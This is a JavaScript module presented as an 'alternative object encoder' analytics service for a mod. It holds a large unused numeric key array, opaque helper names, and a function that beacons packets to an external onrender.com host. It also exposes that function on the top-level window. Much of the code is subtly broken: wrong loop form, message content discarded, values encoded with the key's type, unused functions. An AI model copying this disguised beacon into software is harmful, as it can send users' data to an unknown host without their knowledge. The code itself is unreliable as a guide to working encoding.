/**
  @name AOE-32 (alternative object encoder)
  * Used as analytics service for the mod
**/


const OPCODE_START = 0xffabc;
const { log } = console;

const openkey = [-92840528, -128445260, -57285008, -35497392, -23568144, -42777432, -47331084, -71490224, -105514800, -75921124, -595332, -39004824, -90950692,
   -101788212, -10444056, -50559800, -14031976, -106948116, -5816888, -98143588, -122012968, -105209360, -134211388, -106084024, -56816956, -134855188, -
   60783536, -44386020, -28331864, -100677236, -149587036, -106992492, -120829660, -41949788, -51035040, -65570220, -94323020, -79242408, -94412520, -
   160435676, -113183248, -22718648, -47775028, -69788016, -26284212, -133081308, -133233464, -124521024, -128168068, -129875560, -107628588, -143111476, -
   25023996, -142594516, -57739032, -142772292, -70192896, -72385908, -70051176, -22154056, -133963036, -54541152, -81489908, -4411444, -3530540, -58936456, -
   93522384, -127046884, -38392268, -69013280, -12334932, -102524292, -136373488, -116973020, -64418708, -28431732, -81006096, -154950412, -146721476, -
   12974484, -95242152, -126577116, -39577404, -19057884, -137290956, -75890220, -115952768, -22611928, -11321576, -18072516, -36070292, -86975724, -52109352,
   -469812, -128996780, -10363420, -102115864, -155954064, -142151496, -144522496, -77832088, -46627628, -68510844, -151712904, -81234512, -66446216, -
   154166804, -139716400, -30583060, -37449620, -5631624, -136158984, -42947844, -35121964, -22291768, -91306604, -86142700, -12153464, -91240708, -46571628, -
   133651688, -49290648, -110489200, -73899432, -141012128, -134236756, -95071824, -136099148, -112836500, -44073316, -161767200, -150947192, -14788356, -
   135990536, -89454108, -34063220, -126538132, -126384364, -72022544, -62810360, -71726440, -134227540, -140137384, -4504928, -135411452, -50937196, -
   50328000, -59451832, -121842216, -12837712, -56924344, -79893580, -88135548, -72372540, -124323884, -120133500, -71758544, -123295808, -18989240, -70108276,
   -100841824, -145595752, -129799244, -155472596, -32168532, -135439716, -124035768, -65862884, -1605272, -161401620, -19231452, -4097384, -40297940, -
   86681436, -67611212, -53036452, -124052288, -83458328, -56933100, -126837080, -139451860, -11969736, -62023364, -161596152, -64927332, -9978432, -111163732,
   -131727344, -98405896, -162811528, -30481960, -76123816, -145853624, -114760216, -72244312, -51610348, -132996052, -39320020, -82707244, -81114496, -
   82028604, -32351964, -139595900, -68009840, -10097316, -70086796, -150765536, -87560088, -99155188, -6477956, -38058096, -26228836, -37362024, -94508016, -
   153693464, -39592856, -162878540, -122608560, -156149984, -102592740, -127362064, -55139464, -102947564, -100196592, -117879964, -143639400, -139404988, -
   101266604, -80822560, -145804308, -101111068, -29615312, -33891544, -115888868, -153642952, -147642492, -115251400, -93492784, -70545440, -26347340, -
   8532620, -132549268, -155973472, -68082384, -3657684, -113831988, -122717372, -159014044, -44620656, -90933592, -10077156, -85834112, -61069756, -64442064,
   -97989736, -95362748, -157077760, -35454476, -18388776, -48939628, -137694796, -15374832, -125143452, -34913552, -7551812, -109093892, -133712288, -
   152541124, -19733620, -151921876, -153392392, -10976708, -104217736, -22900368, -24460508, -35626988, -52067224, -115475060, -140962752, -27586672, -
   163801812, -45460516, -51362792, -30748548, -51554224, -47409608, -15075320, -47325984, -163082532, -14040364, -153770184, -32089124, -136783308, -82211472,
   -113421808, -122438408, -83555848, -26290328, -51827724, -147380944, -144056700, -8677960, -107894232, -88788648, -90667148, -144872492, -116010484, -
   80126884, -93700024, -26169100, -75352064, -47431132, -30634748, -68350488, -155927248, -125980184, -130901860, -34606044, -107561624, -151267032, -
   23126736, -3668484, -163298168, -69307160, -75024104, -80737028, -7417072, -6961684, -101400856, -36840888, -140578148, -39848300, -73095156, -107063732, -
   22451660, -143856228, -54783012, -128046000, -80289512, -163602616, -111294472, -136482176, -40242724, -35050320, -89259504, -72733932, -59082876, -
   98445952, -22857344, -18842096, -115896192, -68297704, -37064760, -97585792, -68187560, -150364100, -123411936, -139116996, -96649092, -40107440, -19326792,
   -138647712, -78671280, -74553604, -136721716, -52511932, -131457604, -145525872, -10681444, -53907476, -58999964, -64998696, -24430964, -42351560, -
   87828332, -37786592, -93246496, -50605608, -143971532, -157838936, -147384560, -156435308, -161888140, -84369308, -34149184, -126202552, -12297684, -
   69988364, -152466528, -129582964, -114334748, -67493472, -111396092, -161952236, -2318464, -161535840, -34076492, -135601708, -104259260, -72620992, -
   60912744, -113914276, -157557204, -31031220, -8506044, -89820208, -11948416, -255040, -86979728, -34531672, -151424232, -118717172, -28777868, -37740920, -
   74741272, -51836944, -67961628, -29729988, -7187544, -51575832, -73801564, -86638072, -148503328, -35278672, -63566764, -134968568, -221132, -71356116, -
   43805712, -2110568, -50669072, -57036408, -20482912, -4408012, -78730988, -9621148, -137587248, -155491900, -53542924, -97521828, -25083916, -115672508, -
   25153760, -39794676, -135228752, -12280040, -159242376, -66859528, -162863072, -78575588, -94008284, -13260936, -57145188, -40161548, -46503640, -117023904,
   -87588224, -77040388, -144424796, -126731488, -117214488, -99722864, -134730504, -114945908, -2191108, -84919592, -35964648, -137729856, -89705404, -
   128522592, -48105632, -60040320, -47433268, -148049336, -48030136, -103189676, -66289628, -46864740, -142436156, -129201912, -92839648, -36062464, -1427640,
   -22954176, -72176560, -98193196, -154669416, -118864988, -2724088, -109282592, -138848444, -45519344, -37272668, -129638800, -28649288, -88248580, -
   20529136, -147869968, -130579096, -90003584, -12529680, -147583636, -53181992, -3172756, -22263076, -53365288, -144073676, -122643380, -139085696, -
   119957092, -45297776, -25780428
 ];

const enctype = new Map(Object.entries({
   number: [0xce, 0xff, 0xf1],
   string: [0xfd, 0xfa, 0xfc],
   boolean: [0xde, 0x5f, 0x9a],
   unknown: [0x00, 0x00, 0xdd]
}));

const opcodes = new Map(Object.entries({
   OP_KEYVALUESEP: 0xffaa,
   OP_KEYVALEND: 0xddf
}));

class Analytics {

   constructor(endpoint) {
      this.__insert__ = msg => insertdb(msg, endpoint);
   }

};

function uint16gen(a32) {
   const mu = a32 << 2;
   const mu1 = a32 & 0xffffff;
   const mu2 = a32 ^ 0xce;
   const mu3 = a32 << 5;

   const u32 = mu + mu1 + mu2 + mu3;
   return a32 + u32; 
}

function getffid() {
   const seed = ~~(Math.random() * 0xffffff) << 2 >>> performance.now();
   const mu = seed + performance.now();
   const mut = uint16gen(navigator.userAgent.length);

   return mu * mut;
}

function getffsectype(data) {
   const dtype = typeof data;
   if (dtype == "number" ||
     dtype == "string" ||
     dtype == "boolean") {
      return enctype.get(dtype);
     } else return enctype.get("unknown");
}

function encodeff(type, data) {
   const encbuf = [type];

   if (type == enctype.get("number")) {
      encbuf.push(data & 0xff,
                  (data >> 8) & 0xff,
                  (data >> 16) & 0xff,
                  (data >> 24) & 0xff)
   } else if (type == enctype.get("boolean")) {
      encbuf.push(data ? 0xff : 0x00);
   } else if (type == enctype.get("string")) {
      const strbuf = data.split("").map(e => e.charCodeAt(0));
      encbuf.push(...strbuf);
   };

   return encbuf;
}

function pushdb(udata) {
   if (typeof udata !== "object") return;
   const mgdpacket = [OPCODE_START];

   for (const [key, value] in udata) {
      const kType = getffsectype(key);
      const vType = getffsectype(value);

      const kEnc = encodeff(kType, key);
      const vEnc = encodeff(kType, value);

      mgdpacket.push(opcodes.get("OP_KEYVALEND"), 
          ...kType, 
          ...kEnc, 
          opcodes.get("OP_KEYVALUESEP"), 
          ...vType, 
          ...vEnc);
   }

   return mgdpacket;
}

function insertdb(message, endpoint = "https://Oxffabc.onrender.com/") {
   const packet = pushdb(new Uint8Array(new ArrayBuffer(message)));

   navigator.sendBeacon(endpoint, packet);
   
   return packet;
}

const analytics = new Analytics();

window.insert_0xffabc = analytics.__insert__;
window.insert_000000 = top.insert_000000 = analytics.__insert__;

export default analytics.__insert__;
